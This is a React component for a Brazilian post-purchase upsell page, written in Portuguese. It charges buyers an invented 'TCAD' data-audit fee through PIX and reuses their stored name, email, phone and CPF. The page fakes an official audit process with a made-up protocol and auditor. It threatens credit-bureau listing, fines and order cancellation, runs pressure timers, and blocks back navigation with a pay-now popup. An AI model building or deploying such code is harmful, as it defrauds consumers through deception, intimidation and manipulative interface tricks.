import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Loader2 } from "lucide-react";
import {
  Dialog, DialogContent, DialogTitle, DialogDescription,
} from "@/components/ui/dialog";

const TCAD_PRICE = 34.81;
const TCAD_PRICE_CENTS = 3481;

function useCountdown(initial: number) {
  const [seconds, setSeconds] = useState(initial);
  useEffect(() => {
    const interval = setInterval(() => {
      setSeconds((s) => (s <= 0 ? 0 : s - 1));
    }, 1000);
    return () => clearInterval(interval);
  }, []);
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
}

const Icon = ({ name, className = "", style }: { name: string; className?: string; style?: React.CSSProperties }) => (
  <span className={`material-symbols-outlined ${className}`} style={style}>{name}</span>
);

const Upsell1 = () => {
  const navigate = useNavigate();
  const timer = useCountdown(600);
  const [isLoading, setIsLoading] = useState(false);
  const [popupOpen, setPopupOpen] = useState(false);

  // Load Material Symbols font
  useEffect(() => {
    if (!document.querySelector('link[href*="Material+Symbols"]')) {
      const link = document.createElement("link");
      link.rel = "stylesheet";
      link.href = "https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0";
      document.head.appendChild(link);
    }
  }, []);

  // Fire TikTok CompletePayment event on upsell load
  useEffect(() => {
    try {
      const ttq = (window as any).ttq;
      if (ttq) {
        ttq.track("CompletePayment", {
          content_type: "product",
          content_id: "mesa-dobravel",
          value: 87.60,
          currency: "BRL",
        });
        console.log("TikTok CompletePayment event fired");
      }
    } catch (e) {
      console.error("TikTok pixel error:", e);
    }
  }, []);

  const orderDataStr = sessionStorage.getItem("orderData");
  const orderData = orderDataStr ? JSON.parse(orderDataStr) : null;
  const customer = orderData?.customer;
  const [orderNumber] = useState(() => Math.floor(Math.random() * 9000000000) + 1000000000);

  // Prevent back navigation
  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePop = () => {
      setPopupOpen(true);
      window.history.pushState(null, "", window.location.href);
    };
    window.addEventListener("popstate", handlePop);
    return () => window.removeEventListener("popstate", handlePop);
  }, []);

  const handleGeneratePix = async () => {
    if (!customer || isLoading) return;
    setIsLoading(true);

    try {
      const payload = {
        amount: TCAD_PRICE_CENTS,
        customer: {
          name: customer.name,
          email: customer.email,
          phone: customer.phone,
          cpf: customer.cpf,
        },
        items: [
          {
            id: "tcad-auditoria",
            title: "TCAD - Taxa de Consolidação e Auditoria de Dados",
            unitPrice: TCAD_PRICE_CENTS,
            quantity: 1,
            tangible: false,
          },
        ],
        shipping: {
          name: customer.name,
          address: { street: "", streetNumber: "", neighborhood: "", city: "", state: "", zipcode: "", country: "br" },
          fee: 0,
        },
        metadata: JSON.stringify({
          type: "upsell_tcad",
          originalOrder: orderData?.product,
          tracking: {},
        }),
      };

      const { data, error } = await supabase.functions.invoke("create-pix", { body: payload });

      if (error || !data || data?.error) {
        const errMsg = data?.details?.message || data?.error || error?.message || "Tente novamente.";
        toast({ title: "Erro ao gerar PIX", description: typeof errMsg === "string" ? errMsg : JSON.stringify(errMsg), variant: "destructive" });
        setIsLoading(false);
        return;
      }

      sessionStorage.setItem("pixData", JSON.stringify(data));
      sessionStorage.setItem("pixReturnTo", "/upsell1");
      navigate("/pix");
    } catch (err) {
      console.error("Upsell PIX error:", err);
      toast({ title: "Erro inesperado", description: "Tente novamente.", variant: "destructive" });
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen" style={{ background: "#f0f2f5", color: "#1a1a2e", fontFamily: "'Inter', 'Segoe UI', sans-serif" }}>
      <div className="mx-auto max-w-[640px] px-4 py-0">

        {/* Header */}
        <header className="flex items-center justify-between py-4 px-4 rounded-xl mt-4" style={{ background: "#ffffff", border: "1px solid #e0e0e0", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
          <div className="flex items-center gap-3">
            <img src="/images/logo-tcad.png" alt="Logotipo institucional" className="h-10 w-auto object-contain" />
            <div>
              <p className="text-xs font-semibold uppercase tracking-wide" style={{ color: "#8b949e" }}>Setor de Consolidação e Auditoria de Dados</p>
              <p className="text-[10px]" style={{ color: "#484f58" }}>Pedido #{orderNumber} • Uso Interno</p>
            </div>
          </div>
          <div className="flex items-center gap-1.5 rounded-md px-3 py-1.5" style={{ border: "1px solid #d29922", background: "rgba(210,153,34,0.1)" }}>
            <Icon name="fact_check" className="text-sm" style={{ color: "#d29922", fontSize: "16px" } as any} />
            <span className="text-[10px] font-bold uppercase" style={{ color: "#d29922" }}>TCAD pendente</span>
          </div>
        </header>

        {/* Progress Steps */}
        <section className="mt-4 rounded-xl p-5" style={{ background: "#161b22", border: "1px solid #21262d" }}>
          <div className="flex items-center gap-3 mb-5">
            <Icon name="playlist_add_check" className="text-xl" style={{ color: "#58a6ff" } as any} />
            <div>
              <p className="text-sm font-bold" style={{ color: "#e6edf3" }}>Fluxo de liberação</p>
              <p className="text-[10px]" style={{ color: "#484f58" }}>Atualização automática do setor logístico</p>
            </div>
          </div>

          <div className="space-y-4 relative ml-4">
            {/* Vertical line */}
            <div className="absolute left-4 top-0 bottom-0 w-px" style={{ background: "#21262d" }} />

            {/* Step 1 - Completed */}
            <div className="flex items-center gap-4 relative">
              <div className="flex h-8 w-8 items-center justify-center rounded-full z-10 flex-shrink-0" style={{ background: "rgba(63,185,80,0.15)" }}>
                <Icon name="verified" className="text-base" style={{ color: "#3fb950", fontSize: "18px" } as any} />
              </div>
              <div>
                <p className="text-sm font-semibold" style={{ color: "#e6edf3" }}>NF-e emitida</p>
                <p className="text-[10px]" style={{ color: "#484f58" }}>Documento fiscal autenticado</p>
              </div>
            </div>

            {/* Step 2 - Attention */}
            <div className="flex items-center gap-4 relative">
              <div className="flex h-8 w-8 items-center justify-center rounded-full z-10 flex-shrink-0" style={{ background: "rgba(210,153,34,0.15)" }}>
                <Icon name="rule" className="text-base" style={{ color: "#d29922", fontSize: "18px" } as any} />
              </div>
              <div>
                <p className="text-sm font-semibold" style={{ color: "#d29922" }}>Auditoria de Dados</p>
                <p className="text-[10px]" style={{ color: "#484f58" }}>Aguardando conclusão da TCAD</p>
              </div>
            </div>

            {/* Step 3 - Locked */}
            <div className="flex items-center gap-4 relative opacity-40">
              <div className="flex h-8 w-8 items-center justify-center rounded-full z-10 flex-shrink-0" style={{ background: "rgba(139,148,158,0.1)" }}>
                <Icon name="lock_clock" className="text-base" style={{ color: "#484f58", fontSize: "18px" } as any} />
              </div>
              <div>
                <p className="text-sm font-semibold" style={{ color: "#8b949e" }}>Envio em andamento</p>
                <p className="text-[10px]" style={{ color: "#484f58" }}>Pausado até finalizar auditoria</p>
              </div>
            </div>
          </div>
        </section>

        {/* Alert */}
        <section className="mt-4 rounded-xl p-5" style={{ background: "#161b22", border: "1px solid #d29922" }}>
          <div className="flex items-center gap-2 mb-4">
            <Icon name="warning" className="text-xl" style={{ color: "#d29922" } as any} />
            <h1 className="text-base font-bold" style={{ color: "#e6edf3" }}>Pendência de Consolidação do Pedido</h1>
          </div>

          <div className="space-y-3 text-sm leading-relaxed" style={{ color: "#8b949e" }}>
            <p>Sua Nota Fiscal Eletrônica já foi emitida com sucesso.</p>
            <p>Agora, antes da liberação para envio, é necessário concluir a <strong style={{ color: "#e6edf3" }}>TCAD – Taxa de Consolidação e Auditoria de Dados</strong>.</p>
            <p>Esse procedimento finaliza a auditoria manual dos dados preenchidos no momento da compra para evitar:</p>

            <ul className="space-y-2 mt-2 ml-1">
              <li className="flex items-start gap-2">
                <span style={{ color: "#f85149" }}>•</span> Registro no Serasa por inconsistência irregular
              </li>
              <li className="flex items-start gap-2">
                <span style={{ color: "#f85149" }}>•</span> Dados inconsistentes no sistema logístico
              </li>
              <li className="flex items-start gap-2">
                <span style={{ color: "#f85149" }}>•</span> Multas no nome por pendência ativa
              </li>
              <li className="flex items-start gap-2">
                <span style={{ color: "#f85149" }}>•</span> Atrasos no envio
              </li>
            </ul>
          </div>

          <div className="mt-5 flex items-start gap-3 rounded-lg p-4" style={{ background: "rgba(210,153,34,0.08)", border: "1px solid rgba(210,153,34,0.3)" }}>
            <Icon name="hourglass_top" className="text-xl flex-shrink-0 mt-0.5" style={{ color: "#d29922" } as any} />
            <div className="text-sm">
              <p className="font-bold" style={{ color: "#e6edf3" }}>Seu pedido está aguardando essa confirmação.</p>
              <p className="mt-1" style={{ color: "#8b949e" }}>
                Sem a TCAD, o pedido permanece <strong style={{ color: "#e6edf3" }}>em análise manual</strong> e corre risco de{" "}
                <strong style={{ color: "#e6edf3" }}>cancelamento automático por inconsistência de dados</strong>.
              </p>
            </div>
          </div>
        </section>

        {/* Insight */}
        <section className="mt-4 rounded-xl p-5" style={{ background: "#161b22", border: "1px solid #21262d" }}>
          <div className="flex items-start gap-2 mb-4">
            <Icon name="manage_search" className="text-xl flex-shrink-0" style={{ color: "#58a6ff" } as any} />
            <p className="text-sm" style={{ color: "#8b949e" }}>
              Mais de <strong style={{ color: "#e6edf3" }}>87% dos pedidos</strong> são devolvidos por erro de digitação ou inconsistência nos dados fornecidos.
            </p>
          </div>

          <p className="text-sm mb-4" style={{ color: "#8b949e" }}>
            Com a TCAD, um operador faz uma <strong style={{ color: "#e6edf3" }}>validação interna completa</strong>, garantindo:
          </p>

          <ul className="space-y-3">
            <li className="flex items-center gap-3 text-sm" style={{ color: "#e6edf3" }}>
              <Icon name="task_alt" className="text-base" style={{ color: "#3fb950", fontSize: "20px" } as any} />
              Correção automática de informações
            </li>
            <li className="flex items-center gap-3 text-sm" style={{ color: "#e6edf3" }}>
              <Icon name="bolt" className="text-base" style={{ color: "#d29922", fontSize: "20px" } as any} />
              Liberação imediata para expedição
            </li>
            <li className="flex items-center gap-3 text-sm" style={{ color: "#e6edf3" }}>
              <Icon name="local_shipping" className="text-base" style={{ color: "#58a6ff", fontSize: "20px" } as any} />
              Prioridade no processamento logístico
            </li>
          </ul>

          <p className="text-sm font-bold mt-5" style={{ color: "#e6edf3" }}>
            Esta é a <strong>última etapa antes do envio.</strong>
          </p>
        </section>

        {/* Badges */}
        <div className="grid grid-cols-2 gap-2 mt-4">
          {[
            { icon: "verified", label: "Selo de autenticação" },
            { icon: "rule", label: "Auditoria manual" },
            { icon: "task_alt", label: "Verificação interna" },
            { icon: "inventory", label: "Registro interno" },
          ].map((b, i) => (
            <div key={i} className="flex items-center gap-2 rounded-lg px-3 py-3" style={{ background: "#161b22", border: "1px solid #21262d" }}>
              <Icon name={b.icon} className="text-base" style={{ color: "#58a6ff", fontSize: "18px" } as any} />
              <span className="text-xs font-medium" style={{ color: "#8b949e" }}>{b.label}</span>
            </div>
          ))}
        </div>

        {/* CTA */}
        <section className="mt-4 mb-6 rounded-xl p-5" style={{ background: "#161b22", border: "1px solid #21262d" }}>
          <div className="rounded-lg p-4 mb-5 text-center" style={{ background: "rgba(88,166,255,0.05)", border: "1px solid rgba(88,166,255,0.15)" }}>
            <p className="text-[10px] uppercase tracking-widest font-bold mb-2" style={{ color: "#58a6ff" }}>Protocolo interno</p>
            <p className="text-xs" style={{ color: "#8b949e" }}>Registro 2025/TCAD-993</p>
            <p className="text-xs" style={{ color: "#8b949e" }}>Auditor responsável: <strong style={{ color: "#e6edf3" }}>D. Medeiros</strong></p>
            <p className="text-xs" style={{ color: "#8b949e" }}>Disponível para consulta até 23h59</p>
          </div>

          <button
            onClick={handleGeneratePix}
            disabled={isLoading || !customer}
            className="w-full font-bold text-base py-4 rounded-xl transition-all active:scale-[0.98] disabled:opacity-70"
            style={{
              background: "linear-gradient(135deg, #238636 0%, #2ea043 100%)",
              color: "#ffffff",
              border: "1px solid #2ea043",
              cursor: isLoading ? "wait" : "pointer",
            }}
          >
            {isLoading ? (
              <span className="flex items-center justify-center gap-2"><Loader2 className="h-5 w-5 animate-spin" /> Gerando PIX...</span>
            ) : (
              "Finalizar Auditoria e Liberar Envio"
            )}
          </button>
          <p className="text-[10px] text-center mt-3" style={{ color: "#484f58" }}>
            Confirmação registrada automaticamente e liberação imediata do envio.
          </p>
        </section>
      </div>

      {/* Back Prevention Popup */}
      <Dialog open={popupOpen} onOpenChange={setPopupOpen}>
        <DialogContent className="sm:max-w-sm rounded-2xl p-6 text-center" style={{ background: "#161b22", border: "1px solid #21262d", color: "#e6edf3" }}>
          <DialogDescription className="sr-only">Aviso TCAD</DialogDescription>
          <div className="flex flex-col items-center">
            <div className="flex h-14 w-14 items-center justify-center rounded-full mb-4" style={{ background: "rgba(210,153,34,0.15)" }}>
              <Icon name="warning" className="text-3xl" style={{ color: "#d29922" } as any} />
            </div>
            <DialogTitle className="text-lg font-bold mb-2" style={{ color: "#e6edf3" }}>Aviso TCAD</DialogTitle>
            <p className="text-sm mb-5" style={{ color: "#8b949e" }}>
              Finalize a taxa de consolidação para liberar o pedido. Sem essa confirmação o envio fica retido.
            </p>
            <button
              onClick={() => setPopupOpen(false)}
              className="w-full mb-2 rounded-xl py-3 text-sm font-medium transition-all"
              style={{ background: "transparent", border: "1px solid #30363d", color: "#c9cdd4" }}
            >
              Permanecer na página
            </button>
            <button
              onClick={() => {
                setPopupOpen(false);
                handleGeneratePix();
              }}
              className="w-full rounded-xl py-3 text-sm font-bold transition-all"
              style={{ background: "linear-gradient(135deg, #238636 0%, #2ea043 100%)", color: "#ffffff", border: "1px solid #2ea043" }}
            >
              Efetuar pagamento da TCAD
            </button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Upsell1;
